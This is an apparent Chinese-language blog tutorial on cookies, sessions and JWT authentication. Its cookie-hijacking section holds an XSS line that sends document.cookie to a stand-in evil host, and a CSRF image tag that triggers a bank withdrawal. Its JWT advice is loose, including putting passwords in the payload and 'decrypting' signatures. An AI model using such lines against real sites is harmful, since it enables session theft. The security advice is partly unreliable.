---
layout: post
title: Cookie 、 Session 和 Token
date: 2019-03-07
categories: 前端
tags:
  - token
  - cookie
  - 网络安全
---

`Cookie` 、 `Session` 和 `Token`

最后更新日期 2019-05-17

<!-- more -->

## 前端安全需要注意哪几方面问题

`XSS`（跨域脚本）、`CSRF`（跨站请求伪造攻击）、`arp`、`xff`、中间人攻击、运营商劫持、防暴刷

## Cookie 、 Session 和 Token

简介：

- `cookie` 服务员看你的身份证，给你一个编号，以后，进行任何操作，都出示编号后服务员去看查你是谁。
- `token` 直接给服务员看自己身份证

> 参考文章：
>
> - [cookie 和 token](https://www.jianshu.com/p/ce9802589143)
> - [MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)

### Cookie

`HTTP Cookie`（也叫 `Web Cookie` 或浏览器 `Cookie`）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。`Cookie` 使基于无状态的 `HTTP` 协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

#### cookie 的创建

服务器收到 `HTTP` 请求时，服务器可以在响应头里面添加一个 `Set-Cookie` 选项。浏览器收到响应后通常会保存下 `Cookie`，之后对该服务器每一次请求中都通过 `Cookie` 请求头部将 `Cookie` 信息发送给服务器。
服务端：

```js
  Set-Cookie: <cookie名>=<cookie值>
```

浏览器：(请求头部中加入)

```js
Cookie: <cookie名>=<cookie值>
```

#### JS 中获取 Cookie

通过 `Document.cookie` 属性可创建和访问的 `Cookie`，但是无法访问带有 `HttpOnly` 标记的 `Cookie`（缓解 `XSS` 攻击）

#### cookie 劫持

[MDN-cookie 安全](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E5%AE%89%E5%85%A8)

1. 攻击者通过 `xss` 拿到用户的 `cookie` 然后就可以伪造 `cookie` 了。

   ```js
   new Image().src =
     'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie
   ```

2. 或者通过 `csrf` 在同个浏览器下面通过浏览器会自动带上 `cookie` 的特性在通过用户网站-攻击者网站-攻击者请求用户网站的方式浏览器会自动带上 `cookie`

```html
<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"
/>
```

<!-- ## Cookie 与 Cookie 劫持

[Cookie 与 Cookie 劫持](https://g2ex.github.io/2015/06/29/Cookie-and-Cookie-Injection/) -->

## HTTP Session

`session` 本身是一个抽象的概念，为了实现中断和继续等操作，将 `user agent` 和 `server` 之间一对一的交互，抽象为“会话”，进而衍生出“会话状态”，也就是 `session` 的概念。`Session` 对象存储特定用户会话所需的属性及配置信息，维持一个会话的核心就是客户端的唯一标识，即 `session id`，通常又存储在 `cookie` 中。

## cookie 和 session 有什么区别

- `session` 在服务器端（较安全），`cookie` 在客户端， `session` 默认被存在在服务器的一个文件里（不是内存）
- 储存大小和方式：
  - `cookie`: 不超过 4K，只能保存 `ASCII`
  - `session`: 存储数据远高于 `cookie`, 可保存一些常用变量信息
- 有效期： `cookie` 有效时间长， `session` 一般客户端关闭就失效

## cookie 和 session 的联系

参考： [cookie 和 session](https://juejin.im/post/5cd9037ee51d456e5c5babca#heading-2)

登陆流程： `SessionID` 是连接 `Cookie` 和 `Session` 的一道桥梁，大部分系统也是根据此原理来验证用户登录状态。

特殊情况：

- 浏览器禁止了 `cookie`
  > 解决方法： 请求的时候采用 `post` 请求提交， 或者在地址后面拼上 `SessionID`
- 使用 `Token` 解决

## `token` 加密和登陆验证

> `JWT（JSON Web Tokens）` 用户发送登陆信息至服务器，服务器认证后，生成一个 `JSON` 对象，返回给用户，服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。
> 缺点：由于服务器不保存 `session` 状态，因此无法在使用过程中废止某个 `token`，或者更改 `token` 的权限。也就是说，一旦 `JWT` 签发了，在到期之前就会始终有效。（设置较短的有效期）

- `token`是无状态的，后端服务不需要记录 `token`。每个令牌都是独立的。
- 服务器不记录哪些用户已登陆或者已经发布了哪些 `JWT`。对服务器的每个请求都需要带上验证请求的签名`token`，都要在`HTTP header`中 `Authorization` 字段里，携带服务器返回的 `JSON`
- 服务器对 `JWT` 进行解码，如果 `token` 有效，则处理该请求
- `token` 是放在 `jwtJSON Web Tokens(jwt)`里面下发给客户端的而且不一定存储在哪里（可以存在 `localStorage` `sessionStorage`，或者 `cookie` 中） 不能通过 `document.cookie` 直接拿到，通过 `jwt+ip` 的方式可以防止 被劫持即使被劫持也是无效的 `jwt`
- 也可以储存在 `Cookie` 里面，在请求的时候自动发送，但是不能跨域

```js
// Request Headers 请求中
Authorization: `Bearer ${token}`
```

** JWT 数据格式 **

`Header.Payload.Signature`

> 示例：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NjksInVzZXJuYW1lIjoiXHU1OTI3XHU2Y2IzXHU1NDExXHU0ZTFjXHU2ZDQxIiwicGhvbmUiOiIxMzYyMTg3OTc4NCIsImV4cCI6MTU2MTcwNzYwM30.G77w5AMqu1PbT6YL3P1xYHBhUD16rRYvUwa89Nhkvtw
> 需要使用 `Base64` 转为 字符串

- Header (头部)
- Payload (负载)
- Signature (签名)

### Header

JSON 对象

```js
{
 "alg": "HS256", // 签名所用的算法，默认 `HMAC SHA256（HS256)`
 "typ": "JWT" //token 类型
}
```

### Payload

JSON 对象

```js
  {
    "iss": "签发人",
    "exp": "过期时间",
    "nbf": "生效时间",
    "iat": "签发时间",
    "jti": "编号"
  }
```

### Signature

对 `Header` 和 `Payload` 的签名，防止被篡改， 一般是加上一个唯一的字符串，来防止 `token` 被伪造篡改

简单的使用方法：

- 需要一个 `secret`（随机数）
- 后端利用 `secret` 和加密算法(如：HMAC-SHA256)对 `payload`(如账号密码)生成一个字符串(`token`)，返回给前端
- 前端每次 `request` 在 `header` 中带上登陆返回的 `token`
- 后端用同样的算法解密
